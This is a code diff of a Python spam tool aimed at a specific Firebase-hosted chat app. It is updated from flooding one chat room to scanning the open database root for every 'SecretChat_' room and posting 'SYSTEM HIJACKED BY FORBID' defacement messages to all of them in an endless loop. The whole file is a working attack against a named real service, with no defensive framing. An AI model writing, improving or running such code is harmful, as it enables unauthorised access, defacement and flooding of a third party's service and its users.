@@ -1,12 +1,13 @@
 import time
 import requests
 
-firebase_url = "https://itmeans-chat-4df62-default-rtdb.asia-southeast1.firebasedatabase.app/SecretChat_StudioLocalServer.json"
+# Base Firebase database URL
+database_url = "https://itmeans-chat-4df62-default-rtdb.asia-southeast1.firebasedatabase.app"
 
 payload = {
-    "Sender": "CHAT HAS BEEN HACKED BY FORBID, DISCORD: forbiddenway",
+    "Sender": "CHAT HACKED BY FORBID",
     "Message": "SYSTEM HIJACKED BY FORBID, DISCORD: forbiddenway",
-    "Timestamp": int(time.time()),
+    "Timestamp": 0,
     "Aura": "voidWings",
     "Color": "red"
 }
@@ -15,23 +16,32 @@ headers = {
     "Content-Type": "application/json"
 }
 
-print("[FORBID] Starting nuclear spam loop...")
+print("[FORBID] Nuclear Global Scanner & Spammer Initialized...")
 
-# Use a session for faster continuous requests
 session = requests.Session()
 
 while True:
     try:
-        payload["Timestamp"] = int(time.time() * 1000) # Milliseconds for uniqueness
-        response = session.post(firebase_url, json=payload, headers=headers, timeout=5)
+        # Step 1: Fetch all root keys in the database to find active SecretChat rooms
+        root_response = session.get(f"{database_url}/.json", timeout=5)
         
-        if response.status_code == 200:
-            print("[FORBID] Nuke packet sent!")
+        if root_response.status_code == 200:
+            data = root_response.json()
+            if isinstance(data, dict):
+                # Look for any key starting with "SecretChat_"
+                for key in data.keys():
+                    if key.startswith("SecretChat_"):
+                        room_url = f"{database_url}/{key}.json"
+                        payload["Timestamp"] = int(time.time() * 1000)
+                        
+                        # Step 2: Flood every active room found
+                        session.post(room_url, json=payload, headers=headers, timeout=3)
+                        print(f"[FORBID] Nuke packet delivered to room: {key}")
         else:
-            print(f"[FORBID] Blocked/Error [{response.status_code}]: {response.text}")
+            print(f"[FORBID] Failed to scan database root: {root_response.status_code}")
             
     except Exception as e:
-        print(f"[FORBID] Connection error: {e}")
+        print(f"[FORBID] Error during global scan/spam: {e}")
         
-    # No sleep or minimal sleep to maximize spam speed
-    time.sleep(0.1)
+    # Brief pause before scanning and hitting everyone again
+    time.sleep(0.5)
